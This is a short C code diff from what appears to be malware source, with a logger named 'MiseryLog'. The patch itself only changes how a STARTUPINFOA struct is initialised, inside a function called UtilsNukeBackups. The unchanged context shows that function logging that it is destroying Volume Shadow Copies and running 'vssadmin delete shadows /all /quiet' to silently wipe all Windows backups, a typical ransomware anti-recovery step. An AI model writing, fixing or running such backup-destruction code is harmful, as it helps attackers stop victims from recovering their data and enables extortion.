@@ -9,7 +9,8 @@ static int g_utils_last_error = 0;
 bool UtilsNukeBackups(void) {
     MiseryLog(MISERY_LOG_INFO, "UtilsNukeBackups: Destroying Volume Shadow Copies");
 
-    STARTUPINFOA si = { sizeof(si) };
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
 
     if (CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
